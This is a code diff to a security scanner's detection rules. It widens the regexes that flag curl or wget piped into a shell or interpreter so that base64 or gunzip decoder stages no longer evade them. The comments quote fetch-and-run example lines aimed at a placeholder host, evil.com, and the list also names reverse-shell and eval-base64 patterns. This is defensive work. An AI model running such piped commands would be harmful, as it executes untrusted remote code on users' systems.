@@ -98,7 +98,16 @@ const CRITICAL_PATTERNS = [
   {
     code: 'curl-pipe-shell',
     label: 'curl | sh / wget | bash (remote execution)',
-    re: /\b(?:curl|wget)\s[^\n|]*\|\s*(?:sh|bash|zsh|fish)\b/,
+    // (v1.10.121) Negation widened from [^\n|] to [^\n;] so
+    // intermediate decoder stages (base64 -d, gunzip, xxd -r,
+    // openssl enc -d) between the network fetch and the shell
+    // don't break the match. The classic obfuscation form
+    //   curl evil.com | base64 -d | bash
+    // previously slipped through because the original [^\n|]
+    // class forbade any pipe between curl and bash. Stopping
+    // only at newline / `;` keeps the cross-statement guard
+    // (won't conflate `curl x | grep y; bash separate.sh`).
+    re: /\b(?:curl|wget)\s[^\n;]*\|\s*(?:sh|bash|zsh|fish)\b/,
   },
   {
     code: 'eval-base64',
@@ -120,7 +129,10 @@ const CRITICAL_PATTERNS = [
     // Same shape as curl-pipe-shell but for non-shell interpreters —
     // remote one-liners that fetch and run untrusted code without
     // human review.
-    re: /\b(?:curl|wget)\s[^\n|]*\|\s*(?:python\d*|perl|ruby|node|php)\b/,
+    // (v1.10.121) Same negation widening as curl-pipe-shell so the
+    // base64 -d / gunzip / xxd -r intermediate stage doesn't break
+    // the match for `curl evil.com | base64 -d | python`.
+    re: /\b(?:curl|wget)\s[^\n;]*\|\s*(?:python\d*|perl|ruby|node|php)\b/,
   },
   {
     code: 'reverse-shell',
